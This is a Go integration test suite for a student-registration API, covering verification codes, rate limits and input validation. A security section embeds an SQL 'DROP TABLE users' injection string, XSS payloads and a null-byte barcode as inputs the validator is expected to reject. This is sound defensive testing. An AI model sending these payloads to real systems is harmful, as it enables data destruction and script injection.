package commands

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"

	mailevent "gitlab.com/ucmsv2/ucms-backend/internal/application/mail/event"
	"gitlab.com/ucmsv2/ucms-backend/internal/domain/registration"
	"gitlab.com/ucmsv2/ucms-backend/internal/domain/user"
	"gitlab.com/ucmsv2/ucms-backend/internal/domain/valueobject/roles"
	registrationhttp "gitlab.com/ucmsv2/ucms-backend/internal/ports/http/registration"
	"gitlab.com/ucmsv2/ucms-backend/tests/integration/builders"
	"gitlab.com/ucmsv2/ucms-backend/tests/integration/fixtures"
	"gitlab.com/ucmsv2/ucms-backend/tests/integration/framework"
	"gitlab.com/ucmsv2/ucms-backend/tests/integration/framework/event"
	frameworkhttp "gitlab.com/ucmsv2/ucms-backend/tests/integration/framework/http"
)

type RegistrationIntegrationSuite struct {
	framework.IntegrationTestSuite
}

func TestRegistrationIntegrationSuite(t *testing.T) {
	suite.Run(t, new(RegistrationIntegrationSuite))
}

func (s *RegistrationIntegrationSuite) TestStudentRegistrationFlow() {
	email := "newstudent@test.com"

	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

	s.T().Run("Start Registration", func(t *testing.T) {
		s.HTTP.StartStudentRegistration(t, email).
			AssertAccepted()
	})

	var reg *registration.RegistrationAssertion
	s.T().Run("Verify Registration", func(t *testing.T) {
		reg = s.DB.RequireRegistrationExists(t, email).
			AssertStatus(t, registration.StatusPending).
			AssertVerificationCodeNotEmpty(t).
			AssertIsNotExpired(t)
	})

	var e *registration.RegistrationStarted
	s.T().Run("Verify Registration Event", func(t *testing.T) {
		e = event.RequireEvent(t, s.Event, e)
		require.NotNil(t, e, "Expected RegistrationStarted event to be emitted")
		registration.NewRegistrationStartedAssertion(e).
			AssertRegistrationID(t, reg.Registration.ID()).
			AssertEmail(t, email).
			AssertVerificationCode(t, reg.Registration.VerificationCode())
	})

	// 4. Verify email sent (wait for async event processing)
	s.T().Run("Verify Email Sent", func(t *testing.T) {
		s.Require().Eventually(func() bool {
			mails := s.MockMailSender.GetSentMails()
			return len(mails) > 0
		}, 5*time.Second, 100*time.Millisecond, "Email should be sent within 5 seconds")

		mails := s.MockMailSender.GetSentMails()
		s.Require().Len(mails, 1)
		s.Equal(email, mails[0].To)
		s.Contains(mails[0].Subject, mailevent.RegistrationStartedSubject)
		s.Contains(mails[0].Body, reg.Registration.VerificationCode())
		s.MockMailSender.Reset()
	})

	s.T().Run("Complete Registration", func(t *testing.T) {
		s.HTTP.VerifyRegistrationCode(t, email, reg.Registration.VerificationCode()).
			AssertSuccess()
	})

	s.T().Run("Complete Student Registration", func(t *testing.T) {
		s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: reg.Registration.VerificationCode(),
			Password:         fixtures.TestStudent.Password,
			Barcode:          fixtures.TestStudent.Barcode.String(),
			Username:         fixtures.TestStudent.Username,
			FirstName:        fixtures.TestStudent.FirstName,
			LastName:         fixtures.TestStudent.LastName,
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertSuccess()
	})

	s.T().Run("Verify Student Creation", func(t *testing.T) {
		s.Require().Eventually(func() bool {
			return s.DB.CheckUserExists(t, email)
		}, 5*time.Second, 100*time.Millisecond, "Student should be created within 5 seconds")

		s.DB.RequireStudentExistsByEmail(t, email).
			AssertRole(t, roles.Student).
			AssertFirstName(t, fixtures.TestStudent.FirstName).
			AssertLastName(t, fixtures.TestStudent.LastName).
			AssertGroupID(t, fixtures.SEGroup.ID)
	})

	s.T().Run("Verify Registration Status", func(t *testing.T) {
		reg := s.DB.RequireRegistrationExists(t, email).Registration
		require.Eventually(t, func() bool {
			return reg.IsStatus(registration.StatusCompleted)
		}, 5*time.Second, 100*time.Millisecond, "")
	})

	s.T().Run("Verify Welcome Email Sent", func(t *testing.T) {
		s.Require().Eventually(func() bool {
			mails := s.MockMailSender.GetSentMails()
			return len(mails) > 0
		}, 5*time.Second, 100*time.Millisecond, "Welcome email should be sent within 5 seconds")

		mails := s.MockMailSender.GetSentMails()
		s.Require().Len(mails, 1)
		s.Equal(email, mails[0].To)
		s.Contains(mails[0].Subject, "Welcome to UCMS")
		s.Contains(mails[0].Body, fixtures.TestStudent.FirstName)
		s.MockMailSender.Reset()
	})
}

func (s *RegistrationIntegrationSuite) TestStudentRegistrationWithResend() {
	email := "resend@test.com"

	s.T().Run("resend", func(t *testing.T) {
		reg := builders.NewRegistrationBuilder().
			WithEmail(email).
			WithResendAvailable().
			Build()
		s.DB.SeedRegistration(t, reg)

		s.HTTP.ResendVerificationCode(t, email).AssertAccepted()

		e := event.RequireEvent(t, s.Event, &registration.VerificationCodeResent{})
		registration.NewVerificationCodeSentAssertion(e).
			AssertEmail(t, email).
			AssertRegistrationID(t, reg.ID()).
			AssertVerificationCodeNotEqual(t, reg.VerificationCode()).
			AssertVerificationCodeNotEmpty(t)

		s.Require().Eventually(func() bool {
			mails := s.MockMailSender.GetSentMails()
			return len(mails) > 0
		}, 5*time.Second, 100*time.Millisecond, "Email should be sent within 5 seconds")

		mails := s.MockMailSender.GetSentMails()
		s.Require().Len(mails, 1)
		s.Equal(email, mails[0].To)
		s.Contains(mails[0].Subject, "Verification Code Resent")
		s.Contains(mails[0].Body, e.VerificationCode)
		s.MockMailSender.Reset()
	})

	s.T().Run("resend again, should fail", func(t *testing.T) {
		s.HTTP.ResendVerificationCode(t, email).AssertStatus(http.StatusTooManyRequests)
	})
}

func (s *RegistrationIntegrationSuite) TestStudentRegistration_FailPath() {
	s.T().Run("resend timeout is not passed", func(t *testing.T) {
		email := "resend@test.com"
		reg := builders.NewRegistrationBuilder().
			WithEmail(email).
			WithResendNotAvailable().
			Build()
		s.DB.SeedRegistration(s.T(), reg)

		s.HTTP.ResendVerificationCode(t, email).AssertStatus(http.StatusTooManyRequests)
	})

	s.T().Run("registration not exists", func(t *testing.T) {
		email := "notexists@test.com"
		s.HTTP.ResendVerificationCode(t, email).AssertStatus(http.StatusNotFound)
	})
}

func (s *RegistrationIntegrationSuite) TestConcurrentRegistrations() {
	email := "concurrent@test.com"

	// Start multiple registrations concurrently
	var wg sync.WaitGroup
	responses := make([]*frameworkhttp.Response, 3)

	for i := range 3 {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			responses[idx] = s.HTTP.StartStudentRegistration(s.T(), email)
		}(i)
	}

	wg.Wait()

	// Only one should succeed
	successCount := 0
	for _, resp := range responses {
		if resp.Code == http.StatusAccepted {
			successCount++
		}
	}

	s.Equal(1, successCount, "Only one registration should succeed")
	s.DB.RequireRegistrationCount(s.T(), 1)

	e := event.RequireEvent(s.T(), s.Event, &registration.RegistrationStarted{})
	registration.NewRegistrationStartedAssertion(e).
		AssertEmail(s.T(), email).
		AssertVerificationCodeNotEmpty(s.T()).
		AssertRegistrationIDNotEmpty(s.T())

	s.Eventually(func() bool {
		mails := s.MockMailSender.GetSentMails()
		return len(mails) > 0
	}, 10*time.Second, 100*time.Millisecond, "Email should be sent within 5 seconds")

	mails := s.MockMailSender.GetSentMails()
	s.Require().Len(mails, 1)
	s.Equal(email, mails[0].To)
	s.Contains(mails[0].Subject, mailevent.RegistrationStartedSubject)
	s.Contains(mails[0].Body, e.VerificationCode)
}

func (s *RegistrationIntegrationSuite) TestStartRegistrationValidation() {
	s.T().Run("Invalid Email Format", func(t *testing.T) {
		s.HTTP.StartStudentRegistration(t, "invalid-email").
			AssertBadRequest()
	})

	s.T().Run("Empty Email", func(t *testing.T) {
		s.HTTP.StartStudentRegistration(t, "").
			AssertBadRequest()
	})

	s.T().Run("Email Too Long", func(t *testing.T) {
		longEmail := strings.Repeat("a", 250) + "@test.com"
		s.HTTP.StartStudentRegistration(t, longEmail).
			AssertBadRequest()
	})
}

func (s *RegistrationIntegrationSuite) TestVerificationCodeHandling() {
	email := "verify@test.com"
	s.HTTP.StartStudentRegistration(s.T(), email).AssertAccepted()

	s.T().Run("Invalid Verification Code", func(t *testing.T) {
		s.HTTP.VerifyRegistrationCode(t, email, "WRONG1").
			AssertStatus(http.StatusUnprocessableEntity)
	})

	s.T().Run("Too Many Failed Attempts", func(t *testing.T) {
		email := "failed-attempts@test.com"
		s.HTTP.StartStudentRegistration(t, email).AssertAccepted()

		for range registration.MaxVerificationCodeAttempts - 1 {
			s.HTTP.VerifyRegistrationCode(t, email, "WRONG1").
				AssertStatus(http.StatusUnprocessableEntity)
		}
		s.HTTP.VerifyRegistrationCode(t, email, "WRONG1").
			AssertStatus(http.StatusTooManyRequests)

		s.DB.RequireRegistrationExists(t, email).
			AssertStatus(t, registration.StatusExpired).
			AssertCodeAttempts(t, 3)
	})

	s.T().Run("Verify Already Expired Code", func(t *testing.T) {
		email := "expired@test.com"
		expiredReg := s.Builder.Registration.ExpiredRegistration(email)
		s.DB.SeedRegistration(s.T(), expiredReg)

		reg := s.DB.RequireRegistrationExists(t, email)
		s.HTTP.VerifyRegistrationCode(t, email, reg.Registration.VerificationCode()).
			AssertStatus(http.StatusUnprocessableEntity)
	})
}

func (s *RegistrationIntegrationSuite) TestCompleteRegistrationValidation() {
	s.T().Run("Weak Password", func(t *testing.T) {
		email := "weak-password@test.com"
		s.setupVerifiedRegistration(email)

		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: s.getVerificationCode(email),
			Password:         "weak",
			Barcode:          "STU001",
			Username:         "weakuser",
			FirstName:        "Test",
			LastName:         "Student",
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertBadRequest()
	})

	s.T().Run("Duplicate Barcode", func(t *testing.T) {
		email := "duplicate@test.com"
		s.setupVerifiedRegistration(email)
		student := s.Builder.User.Student("existing@test.com")

		s.DB.SeedStudent(s.T(), student)

		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: s.getVerificationCode(email),
			Password:         fixtures.TestStudent.Password,
			Barcode:          string(student.User().Barcode()),
			Username:         "newuser",
			FirstName:        "Test",
			LastName:         "Student",
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertStatus(http.StatusConflict)
	})

	s.T().Run("Invalid Group ID", func(t *testing.T) {
		email := "invalid-group@test.com"
		s.setupVerifiedRegistration(email)
		invalidGroupID := uuid.New()

		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: s.getVerificationCode(email),
			Password:         fixtures.TestStudent.Password,
			Barcode:          "STU002",
			Username:         "invalidgroupuser",
			FirstName:        "Test",
			LastName:         "Student",
			GroupId:          invalidGroupID,
		}).AssertStatus(http.StatusNotFound)
	})
}

func (s *RegistrationIntegrationSuite) TestRegistrationStates() {
	s.T().Run("Complete Without Verification", func(t *testing.T) {
		email := "no-verify@test.com"
		s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

		s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
		reg := s.DB.RequireRegistrationExists(t, email)

		s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: reg.Registration.VerificationCode(),
			Password:         fixtures.TestStudent.Password,
			Barcode:          "STU003",
			Username:         "noverifyuser",
			FirstName:        "Test",
			LastName:         "Student",
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertBadRequest()
	})

	s.T().Run("Double Complete", func(t *testing.T) {
		email := "double-complete@test.com"
		s.setupCompletedRegistration(email)

		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: s.getVerificationCode(email),
			Password:         fixtures.TestStudent.Password,
			Barcode:          "STU004",
			Username:         "doublecompleteuser",
			FirstName:        "Test",
			LastName:         "Student",
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertStatus(http.StatusConflict)
	})
}

func (s *RegistrationIntegrationSuite) TestBusinessRules() {
	s.T().Run("Registration Already Exists", func(t *testing.T) {
		email := "existing@test.com"
		s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
		s.HTTP.StartStudentRegistration(t, email).AssertStatus(http.StatusTooManyRequests)
	})

	s.T().Run("Name Length Validation", func(t *testing.T) {
		email := "names@test.com"
		s.setupVerifiedRegistration(email)

		s.HTTP.CompleteStudentRegistration(s.T(), registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: s.getVerificationCode(email),
			Password:         fixtures.TestStudent.Password,
			Barcode:          "STU005",
			Username:         "nameuser",
			FirstName:        "X",
			LastName:         strings.Repeat("A", 101),
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		}).AssertBadRequest()
	})
}

func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_RequestValidation() {
	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

	tests := []struct {
		name           string
		setup          func(req *registrationhttp.CompleteStudentRegistrationRequest)
		expectedStatus int
		message        string
		setupBefore    bool
	}{
		{
			name: "Empty Email",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Email Address cannot be blank",
		},
		{
			name: "Invalid Email Format",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "invalid-email"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Email Address must be a valid email address",
		},
		{
			name: "Empty Verification Code",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.VerificationCode = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Verification Code cannot be blank",
		},
		{
			name: "Empty Password",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password cannot be blank",
		},
		{
			name: "Empty Barcode",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode cannot be blank",
		},
		{
			name: "Invalid Barcode Format",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "INVALID-BARCODE"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode must contain English letters and digits only",
			setupBefore:    true,
		},
		{
			name: "Empty First Name",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "First Name cannot be blank",
		},
		{
			name: "Empty Last Name",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = ""
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Last Name cannot be blank",
		},
		{
			name: "Invalid Group ID",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.GroupId = uuid.New()
			},
			expectedStatus: http.StatusNotFound,
			message:        "Academic Group not found",
		},
		{
			name: "Group ID Not Provided",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.GroupId = uuid.Nil
			},
			expectedStatus: http.StatusBadRequest,
		},
		{
			name: "Group ID Not Found",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.GroupId = uuid.New()
			},
			expectedStatus: http.StatusNotFound,
			message:        "Academic Group not found",
		},
		// Password validation test cases
		{
			name: "Password Too Short",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = "Pass1!"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password the length must be between 8 and 128",
		},
		{
			name: "Password Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = strings.Repeat("Password1!", 15) // 150 characters
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password the length must be between 8 and 128",
		},
		{
			name: "Password Missing Uppercase",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = "password123!"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password must contain at least 8 characters with uppercase, lowercase, number, and special character",
		},
		{
			name: "Password Missing Lowercase",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = "PASSWORD123!"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password must contain at least 8 characters with uppercase, lowercase, number, and special character",
		},
		{
			name: "Password Missing Number",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = "Password!"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password must contain at least 8 characters with uppercase, lowercase, number, and special character",
		},
		{
			name: "Password Missing Special Character",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Password = "Password123"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Password must contain at least 8 characters with uppercase, lowercase, number, and special character",
		},
		// Name validation test cases
		{
			name: "First Name Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = strings.Repeat("A", 151)
			},
			expectedStatus: http.StatusBadRequest,
			message:        "First Name the length must be between 1 and 150",
		},
		{
			name: "Last Name Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = strings.Repeat("B", 151)
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Last Name the length must be between 1 and 150",
		},
		{
			name: "First Name Invalid Characters",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "John123"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "must be a valid name",
		},
		{
			name: "Last Name Invalid Characters",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "Smith@#$"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "must be a valid name",
		},
		// valid names with special characters
		{
			name: "First Name With Valid Special Characters",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU001"
				req.Email = "valid-firstname-1@test.com"
				req.FirstName = "Jean-Pierre"
			},
			expectedStatus: http.StatusOK,
			setupBefore:    true,
		},
		{
			name: "Last Name With Apostrophe",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU002"
				req.Email = "valid-lastname-1@test.com"
				req.LastName = "O'Connor"
			},
			expectedStatus: http.StatusOK,
			setupBefore:    true,
		},
		// Email validation edge cases
		{
			name: "Email Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				longEmail := strings.Repeat("a", 250) + "@test.com"
				req.Email = longEmail
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Email Address must be a valid email address",
		},
		{
			name: "Email Too Short",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "a@b"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Email Address must be a valid email address",
		},
		// Barcode validation edge cases
		{
			name: "Barcode Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = strings.Repeat("A", 21) // Over typical barcode length
				req.Email = "barcode-too-long@test.com"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode the length must be between 6 and 20",
			setupBefore:    true,
		},
		{
			name: "Barcode With Spaces",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU 001"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode must contain English letters and digits only",
			setupBefore:    true,
		},
		{
			name: "Barcode With Unicode Characters",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STUদেন্ট001"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode must contain English letters and digits only",
			setupBefore:    true,
		},
		{
			name: "Null Bytes in Barcode",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Barcode = "STU001\x00admin"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Barcode must contain English letters and digits only",
			setupBefore:    true,
		},
		// Verification code edge cases
		{
			name: "Verification Code Too Long",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.VerificationCode = strings.Repeat("1", 20)
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Verification Code",
		},
		{
			name: "Verification Code With Special Characters",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.VerificationCode = "123@#$"
			},
			expectedStatus: http.StatusBadRequest,
			message:        "Verification Code",
		},
	}

	for _, tt := range tests {
		s.T().Run(tt.name, func(t *testing.T) {
			request := registrationhttp.CompleteStudentRegistrationRequest{
				Email:            fixtures.TestStudent.Email,
				VerificationCode: "123456",
				Password:         fixtures.TestStudent.Password,
				Barcode:          string(fixtures.TestStudent.Barcode),
				Username:         fmt.Sprintf("user_%d", time.Now().UnixNano()),
				FirstName:        fixtures.TestStudent.FirstName,
				LastName:         fixtures.TestStudent.LastName,
				GroupId:          uuid.UUID(fixtures.SEGroup.ID),
			}
			originalEmail := request.Email
			tt.setup(&request)
			if tt.setupBefore {
				// If the test case didn't change the email, generate a unique one to avoid rate limiting
				if request.Email == originalEmail {
					request.Email = fmt.Sprintf("test-%d@test.com", time.Now().UnixNano())
				}
				s.setupVerifiedRegistration(request.Email)
				request.VerificationCode = s.getVerificationCode(request.Email)
			}
			response := s.HTTP.CompleteStudentRegistration(t, request)
			response.AssertStatus(tt.expectedStatus).AssertContainsMessage(tt.message)
		})
	}
}

func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_BusinessErrors() {
	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

	tests := []struct {
		name            string
		setup           func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest)
		expectedStatus  int
		expectedMessage string
	}{
		{
			name: "Registration Not Found",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "nonexistent@test.com"
				req.VerificationCode = "123456"
				req.Barcode = "110011"
				req.Username = "nonexistentuser"
			},
			expectedStatus:  http.StatusNotFound,
			expectedMessage: "Resource not found",
		},
		{
			name: "Email Not Verified First",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "not-verified@test.com"
				s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
				reg := s.DB.RequireRegistrationExists(t, email)
				req.Email = email
				req.VerificationCode = reg.Registration.VerificationCode()
				req.Barcode = "110012"
				req.Username = "notverifieduser"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Please verify your email first",
		},
		{
			name: "Invalid Verification Code",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "invalid-code@test.com"
				s.HTTP.StartStudentRegistration(t, email).AssertAccepted()
				s.DB.RequireRegistrationExists(t, email)

				req.Email = email
				req.VerificationCode = "WRONG1"
				req.Barcode = "110013"
				req.Username = "invalidcodeuser"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Please verify your email first", // Since email not verified, it should fail with verify first
		},
		{
			name: "Invalid Verification Code Length",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "invalid-code-length@test.com"
				s.setupVerifiedRegistration(email)
				req.Email = email
				req.VerificationCode = "WRONG123" // 8 characters instead of 6
				req.Barcode = "110014"
				req.Username = "invalidcodelengthuser"
			},
			expectedStatus:  http.StatusBadRequest,
			expectedMessage: "Verification Code the length must be exactly 6",
		},
		{
			name: "Registration Already Completed",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "completed@test.com"
				s.setupCompletedRegistration(email)

				req.Email = email
				req.VerificationCode = s.getVerificationCode(email)
				req.Barcode = "110015"
				req.Username = "completeduser"
			},
			expectedStatus:  http.StatusConflict,
			expectedMessage: "This email address is already registered",
		},
		{
			name: "Duplicate Student Barcode",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "duplicate-barcode@test.com"
				s.setupVerifiedRegistration(email)

				diffEmail := "duplicate-barcode2@test.com"
				existingStudent := builders.NewStudentBuilder().WithEmail(diffEmail).WithBarcode("110016").Build()
				s.DB.SeedStudent(t, existingStudent)

				req.Email = email
				req.VerificationCode = s.getVerificationCode(email)
				req.Barcode = existingStudent.User().Barcode().String()
				req.Username = existingStudent.User().Username()
			},
			expectedStatus:  http.StatusConflict,
			expectedMessage: "This barcode is already in use",
		},
		{
			name: "User Already Exists With Email",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "existing-user@test.com"
				s.setupVerifiedRegistration(email)

				// Create an existing user with the same email
				existingUser := builders.NewStudentBuilder().WithEmail(email).WithBarcode("110017").Build()
				s.DB.SeedStudent(t, existingUser)

				req.Email = email
				req.VerificationCode = s.getVerificationCode(email)
				req.Barcode = existingUser.User().Barcode().String()
				req.Username = existingUser.User().Username()
			},
			expectedStatus:  http.StatusConflict,
			expectedMessage: "This email address is already registered",
		},
		{
			name: "Username already Taken",
			setup: func(t *testing.T, req *registrationhttp.CompleteStudentRegistrationRequest) {
				email := "username-taken@test.com"
				s.setupVerifiedRegistration(email)

				existingUser := builders.NewStudentBuilder().WithUsername("takenusername").WithBarcode("110018").Build()
				s.DB.SeedStudent(t, existingUser)

				req.Email = email
				req.Username = existingUser.User().Username()
				req.Barcode = existingUser.User().Barcode().String()
				req.VerificationCode = s.getVerificationCode(email)
			},
			expectedStatus:  http.StatusConflict,
			expectedMessage: "This username is already taken",
		},
	}

	for _, tt := range tests {
		s.T().Run(tt.name, func(t *testing.T) {
			req := registrationhttp.CompleteStudentRegistrationRequest{
				Email:            "",
				VerificationCode: "",
				Password:         fixtures.TestStudent.Password,
				Barcode:          "",
				Username:         "",
				FirstName:        fixtures.TestStudent.FirstName,
				LastName:         fixtures.TestStudent.LastName,
				GroupId:          uuid.UUID(fixtures.SEGroup.ID),
			}

			tt.setup(t, &req)

			response := s.HTTP.CompleteStudentRegistration(t, req)

			response.AssertStatus(tt.expectedStatus)
			if tt.expectedMessage != "" {
				response.AssertContainsMessage(tt.expectedMessage)
			}
		})
	}
}

func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_VerificationCodeExpired() {
	s.T().Run("Expired Verification Code", func(t *testing.T) {
		email := "expired-code@test.com"
		s.DB.SeedGroup(t, fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

		// Create an expired registration
		expiredReg := s.Builder.Registration.ExpiredRegistration(email)
		s.DB.SeedRegistration(t, expiredReg)

		response := s.HTTP.CompleteStudentRegistration(t, registrationhttp.CompleteStudentRegistrationRequest{
			Email:            email,
			VerificationCode: expiredReg.VerificationCode(),
			Password:         fixtures.TestStudent.Password,
			Barcode:          fixtures.TestStudent.Barcode.String(),
			Username:         fixtures.TestStudent.Username,
			FirstName:        fixtures.TestStudent.FirstName,
			LastName:         fixtures.TestStudent.LastName,
			GroupId:          uuid.UUID(fixtures.SEGroup.ID),
		})

		response.AssertStatus(http.StatusBadRequest).
			AssertContainsMessage("Please verify your email first")
	})
}

// TestRegistration_StudentComplete_SecurityValidation tests security-related validation
func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_SecurityValidation() {
	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

	tests := []struct {
		name    string
		setup   func(req *registrationhttp.CompleteStudentRegistrationRequest)
		message string
	}{
		{
			name: "SQL Injection in Email",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.Email = "test'; DROP TABLE users; --@test.com"
			},
			message: "Email Address must be a valid email address",
		},
		{
			name: "XSS in First Name",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "<script>alert('xss')</script>"
			},
			message: "must be a valid name",
		},
		{
			name: "XSS in Last Name",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.LastName = "<img src=x onerror=alert('xss')>"
			},
			message: "must be a valid name",
		},
		{
			name: "HTML Entities in Name",
			setup: func(req *registrationhttp.CompleteStudentRegistrationRequest) {
				req.FirstName = "&lt;script&gt;alert('test')&lt;/script&gt;"
			},
			message: "must be a valid name",
		},
	}

	for _, tt := range tests {
		s.T().Run(tt.name, func(t *testing.T) {
			request := registrationhttp.CompleteStudentRegistrationRequest{
				Email:            fixtures.TestStudent.Email,
				VerificationCode: "123456",
				Password:         fixtures.TestStudent.Password,
				Barcode:          string(fixtures.TestStudent.Barcode),
				Username:         fixtures.TestStudent.Username,
				FirstName:        fixtures.TestStudent.FirstName,
				LastName:         fixtures.TestStudent.LastName,
				GroupId:          uuid.UUID(fixtures.SEGroup.ID),
			}
			tt.setup(&request)

			response := s.HTTP.CompleteStudentRegistration(t, request)
			response.AssertBadRequest().AssertContainsMessage(tt.message)
		})
	}
}

func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors() {
	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)

	// Modern and comprehensive injection test vectors
	tests := []struct {
		name            string
		setup           func(req *registrationhttp.CompleteStudentRegistrationRequest)
		expectedStatus  int
		expectedMessage string
		description     string
		setupBefore     bool
		assertFunc      func(t *testing.T, u *user.UserAssertions)
	}{
		// Advanced SQL Injection Variants
		{
